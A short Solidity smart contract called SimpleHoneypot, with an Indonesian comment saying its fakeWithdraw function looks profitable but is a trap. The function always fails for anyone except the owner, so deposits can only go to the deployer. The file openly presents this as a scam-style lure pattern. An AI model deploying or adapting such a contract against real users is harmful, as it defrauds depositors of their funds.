// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract SimpleHoneypot {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function deposit() public payable {}

    function withdraw() public {
        require(msg.sender == owner, "Not the owner");
        payable(msg.sender).transfer(address(this).balance);
    }
    
    // Terlihat menguntungkan, tetapi ada jebakan.
    function fakeWithdraw() public {
        if (msg.sender != owner) {
            revert("This function will always fail");
        }
        payable(msg.sender).transfer(1 ether);
    }
}
